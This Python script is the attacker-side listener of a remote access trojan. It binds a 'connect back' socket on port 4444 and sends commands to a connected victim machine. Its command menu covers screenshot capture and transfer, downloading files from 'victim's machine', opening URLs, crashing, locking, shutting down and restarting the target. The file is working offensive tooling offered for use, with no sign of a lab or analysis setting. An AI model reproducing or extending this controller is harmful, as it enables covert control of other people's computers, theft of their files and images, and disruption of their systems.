#! /usr/share/python 3

import socket
import subprocess
import sys
import os
import time
import netifaces as ni
import signal
import readline
import pickle
import struct
import base64
from io import StringIO, BytesIO
import base64
from PIL import Image
import datetime

subprocess.call(['clear'])

GREEN = '\33[32m'
RED = '\33[31m'
YELLOW = '\33[33m'
CYAN = '\033[1;36m'
END = '\33[0m'
CURL = '\33[4m'

createS = (GREEN + '[*] Attempting to create socket... ' + END)
success = (GREEN + '[*] Success! ' + END)
restarting = (YELLOW + '\n[!] Trying to restart... ' + END)
restartTerminal = (YELLOW + '[!] Sometimes restarting the terminal may help... ' + END)
bindS = (GREEN + '[*] Binding socket to port...' + END)
failed = (RED + '[!] Failed!' + END)

def signal_handler(sig, frame):
    print(RED + '\n\nQuitting...\n' + END)
    sys.exit(0)

def socketCreate():
    try:
        time.sleep(0.5)
        global neti
        global ip
        global host
        global port
        global showPort
        global s
        try:
            # ASK FOR AND SET NETWORK INTERFACE
            netI = input(GREEN + '[*] Input you prefered network interface. (Press enter for wlan0): ' + END)
            if netI == '':
                netI = 'wlan0'
            print(GREEN + '[*] Using network interaces ' + END + CYAN + netI + END)
        except:
            print(RED + '[!] Incorrect network interface!' + END)
            sys.exit(1)
            
        try:
            # ASK FOR AND SET IP ADDRESS
            ni.ifaddresses(netI)
            ip = ni.ifaddresses(netI)[ni.AF_INET][0]['addr']
            host = input(GREEN + '[*] Choose connect bask address (Press enter for ' + ip + '): ' + END)
            if host == '':
                host = ip
            print(GREEN + '[*] Using IP ' + END + CYAN + host + END)
        except:
            print(RED + '[!] There was an error getting the IP address. Try checking your network interface.' + END)
            sys.exit(1)
        try:
           # ASK FOR AND SET PORT
           port = input(GREEN + '[*] Input the connect back port (Press enter for 4444): ' + END)
           if port == '':
               port = '4444'
           print(GREEN + '[*] Using port ' + END + CYAN + port + END)
           port = int(port)
           showPort = str(port)
        except:
            print(RED + '[!] There was an unknown error creating to port!' + END)
            sys.exit(1)

        print(createS)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        time.sleep(0.5)
        print(success)
    except socket.error:
        print(failed)

def socketBind():
    try:
        time.sleep(0.5)
        print(bindS)
        time.sleep(0.5)
        s.bind((host, port))
        print(success)
    except socket.error:
        print(failed)
        print(restarting)
        print(restartTerminal)
        time.sleep(1)
        subprocess.call(['clear'])
        socketBind()

def listening():
    s.listen(1)
    print(GREEN + '\n[*] Listening on ' + END + CYAN + ip + ':' + showPort + END)

def socketAccept():
    global conn
    global addr

    conn, addr, = s.accept()
    print(GREEN + '\n[*] Session opened at ' + END + CYAN + addr[0] + ':' + str(addr[1]) + '\n' + END)

    sendCommands(conn)

def sendCommands(conn):
    while True:
        cmd = input(CYAN + str(addr[0]) + ':' + str(addr[1]) + ' > ' + END)

        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        elif cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        elif cmd == 'help':
            print('                   ')
            print('Help Commands')
            print('=============')
            print('                   ')
            print('Commands                 Description')
            print('--------                 -----------')
            print('quit                     Exit script')
            print('exit                     Quit script')
            print('sysinfo                  View basic client information')
            print('screenshot               Take a screenshot of machine')
            print('download -s              Download screenshot to your computer')
            print("download -f [file]       Download a .txt file from victim's machine")
            print("openurl [url]            Open a url page in the victim's machine")
            print('memory                   Print phyiscal and virtual memory')
            print('crash                    Attempt to crash computer')
            print('lock                     Lock computer screen')
            print('shutdown                 Shutdown computer')
            print('restart                  Restart computer')
            print('                     ')
        elif cmd == 'sysinfo':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'clear':
            subprocess.call(['clear'])
        elif cmd == '':
            pass
        elif cmd == 'shutdown':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'restart':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'memory':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), 'utf-8')
            print(clientResponse)
            print('             ')
        elif cmd[:7] == 'openurl':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'crash':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd[:4] == 'lock':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print('\n' + clientResponse, end="")
        elif cmd[:11] == 'download -f':
            try:
                conn.send(str.encode(cmd))
                print('\n' + YELLOW + "[!] Please use this for 'txt' or other document file transfers. Use 'download -s' to transfer a taken screenshot. Type Q to quit." + END)
                print(YELLOW + "[!] Recommended download size is no more than 3GBs! ")
                filename = input('\n' + CYAN + '[*] Please enter a filename for the incoming file: ' + END + GREEN)
                file = open('downloads/' + filename, 'wb')
                file_data = conn.recv(1024)
                print(GREEN + '\n' + '[*] Downloading...' + END)
                file.write(file_data)
                file.close()
                print(GREEN + '[*] Downloaded successfully to downloads/' + filename + END)
            except:
                print(RED + '[!] There was an error downloading your file.' + END)
                pass
        elif cmd == 'screenshot':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print('\n' + clientResponse, end='')
        elif cmd == 'download -s':
            print('                 ')
            print(GREEN + '[*] Transfering screenshot... This can take up to 20 seconds...' + END)
            conn.send(str.encode(cmd))
            data = b""
            payload_size = struct.calcsize(">L")
            #print("payload_size: {}".format(payload_size))
            while len(data) < payload_size:
                #print("Recv: {}".format(len(data)))
                data += conn.recv(8192)
            #print("Done Recv: {}".format(len(data)))
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            #print("msg_size: {}".format(msg_size))
            while len(data) < msg_size:
                data += conn.recv(8192)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = base64.b64decode(frame)
            img = Image.open(BytesIO(frame))
            imgname = 'downloads/screenshot' + str(datetime.datetime.now()) + '.png'
            img.save(imgname)
            print(GREEN + '[*] Screenshot output in ' + END + CYAN + imgname + END)
            print('                     ')
        elif cmd == 'dir':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print('\n' + clientResponse, end="")
        else:
            print(RED + '\n[!] Command no recognized\n' + END)


def main():
    signal.signal(signal.SIGINT, signal_handler)

    socketCreate()
    socketBind()
    listening()
    socketAccept()

if __name__ == '__main__':
    main()
